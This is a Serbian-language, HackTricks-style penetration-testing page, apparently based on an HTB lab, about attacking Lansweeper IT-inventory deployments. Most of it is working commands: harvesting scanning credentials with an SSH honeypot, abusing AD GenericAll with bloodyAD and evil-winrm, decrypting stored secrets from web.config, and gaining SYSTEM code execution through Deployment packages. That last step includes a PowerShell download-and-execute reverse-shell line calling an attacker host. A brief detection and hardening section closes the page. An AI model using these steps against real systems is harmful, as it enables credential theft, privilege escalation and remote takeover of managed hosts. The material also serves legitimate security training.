# Lansweeper zloupotreba: prikupljanje kredencijala, dešifrovanje secrets i Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper je platforma za otkrivanje i inventar IT asseta koja se često postavlja na Windows i integriše sa Active Directory. Kredencijali konfigurisani u Lansweeper-u koriste se za autentifikaciju njegovih scanning engine-a na assetima preko protokola kao što su SSH, SMB/WMI i WinRM. Pogrešne konfiguracije često omogućavaju:

- Presretanje kredencijala preusmeravanjem scanning targeta na host pod kontrolom napadača (honeypot)
- Zloupotrebu AD ACL-ova izloženih grupama povezanim sa Lansweeper-om radi dobijanja remote pristupa
- Dešifrovanje Lansweeper-configured secrets na hostu (connection strings i sačuvani scanning kredencijali)
- Izvršavanje koda na managed endpointima putem Deployment funkcije (često sa privilegijama SYSTEM)

Ova stranica sažima praktične napadačke tokove i komande za zloupotrebu ovog ponašanja tokom engagementa.

## 1) Prikupljanje scanning kredencijala putem honeypot-a (primer sa SSH-om)

Ideja: kreirati Scanning Target koji pokazuje na vaš host i mapirati postojeće Scanning Credentials na njega. Kada se scan pokrene, Lansweeper će pokušati da se autentifikuje tim kredencijalima, a vaš honeypot će ih uhvatiti.<sup>[[1]](#references)</sup>

Pregled koraka (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (ili Single IP) = vaša VPN IP adresa
- Konfigurisati SSH port na vrednost koja je dostupna (npr. 2022 ako je 22 blokiran)
- Onemogućiti schedule i planirati ručno pokretanje
- Scanning → Scanning Credentials → proveriti da Linux/SSH creds postoje; mapirati ih na novi target (po potrebi omogućiti sve)
- Kliknuti na “Scan now” na targetu
- Pokrenuti SSH honeypot i preuzeti pokušani username/password

Primer sa sshesame:<sup>[[2]](#references)</sup>
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Proverite prikupljene kredencijale na DC servisima:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Napomene
- Radi slično i za druge protokole kada možete da naterate scanner da se poveže sa vašim listenerom (SMB/WinRM honeypots itd.). SSH je često najjednostavniji.
- Mnogi scanneri se identifikuju karakterističnim client bannerima (npr. RebexSSH) i pokušaće da izvrše bezopasne komande (uname, whoami itd.).

## 2) AD ACL abuse: steknite remote access dodavanjem sebe u app-admin grupu

Koristite BloodHound za enumeraciju efektivnih prava kompromitovanog naloga. Čest nalaz je scanner- ili app-specific grupa (npr. “Lansweeper Discovery”) koja ima GenericAll nad privilegovanom grupom (npr. “Lansweeper Admins”). Ako je privilegovana grupa takođe član grupe “Remote Management Users”, WinRM postaje dostupan čim dodamo sebe.<sup>[[1]](#references)[[5]](#references)</sup>

Primeri prikupljanja:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Iskoristite GenericAll nad grupom pomoću BloodyAD (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Zatim dobijte interaktivni shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Savet: Kerberos operacije zavise od tačnog vremena. Ako naiđete na KRB_AP_ERR_SKEW, prvo sinhronizujte vreme sa DC-om:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Dešifrovanje tajni konfigurisanih u Lansweeper-u na hostu

Na Lansweeper serveru, ASP.NET sajt obično čuva enkriptovani connection string i simetrični ključ koji aplikacija koristi. Uz odgovarajući lokalni pristup, možete dešifrovati DB connection string, a zatim izdvojiti sačuvane credentials za skeniranje.<sup>[[1]](#references)</sup>

Tipične lokacije:
- Web konfiguracija: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Ključ aplikacije: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Koristite SharpLansweeperDecrypt da automatizujete dešifrovanje i ispis sačuvanih creds-a:<sup>[[3]](#references)</sup>
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Očekivani izlaz uključuje detalje DB konekcije i scanning akreditive u čistom tekstu, kao što su Windows i Linux nalozi koji se koriste širom infrastrukture. Oni često imaju povišena lokalna prava na hostovima domena:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Koristite pronađene Windows scanning creds za privilegovani pristup:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Kao član grupe “Lansweeper Admins”, web UI prikazuje opcije Deployment i Configuration. U okviru Deployment → Deployment packages možete kreirati pakete koji izvršavaju proizvoljne komande na ciljanim assetima. Izvršavanje obavlja Lansweeper servis sa visokim privilegijama, što omogućava code execution kao NT AUTHORITY\SYSTEM na izabranom hostu.<sup>[[1]](#references)</sup>

Koraci na visokom nivou:
- Kreirajte novi Deployment package koji izvršava PowerShell ili cmd one-liner (reverse shell, add-user itd.).
- Izaberite željeni asset (npr. DC/host na kojem Lansweeper radi) i kliknite na Deploy/Run now.
- Preuzmite svoj shell kao SYSTEM.

Primeri payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment actions are noisy and leave logs in Lansweeper and Windows event logs. Koristite ih promišljeno.

## Detekcija i hardening

- Ograničite ili uklonite anonymous SMB enumerations. Nadgledajte RID cycling i anomalni pristup Lansweeper shares.
- Egress controls: blokirajte ili strogo ograničite odlazni SSH/SMB/WinRM sa scanner hosts. Upozoravajte na nestandardne portove (npr. 2022) i neuobičajene client banners kao što je Rebex.
- Zaštitite `Website\\web.config` i `Key\\Encryption.txt`. Externalize secrets u vault i rotirajte ih nakon exposure-a. Razmotrite service accounts sa minimalnim privilegijama i gMSA gde je izvodljivo.
- AD monitoring: upozoravajte na promene grupa povezanih sa Lansweeper-om (npr. “Lansweeper Admins”, “Remote Management Users”) i na ACL changes koji dodeljuju GenericAll/Write membership privilegovanim grupama.
- Audit Deployment package creations/changes/executions; upozoravajte na packages koji pokreću cmd.exe/powershell.exe ili neočekivane outbound connections.

## Povezane teme
- SMB/LSA/SAMR enumeration i RID cycling
- Kerberos password spraying i razmatranja u vezi sa clock skew
- BloodHound path analysis application-admin grupa
- WinRM usage i lateral movement

## Reference
- [1] [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
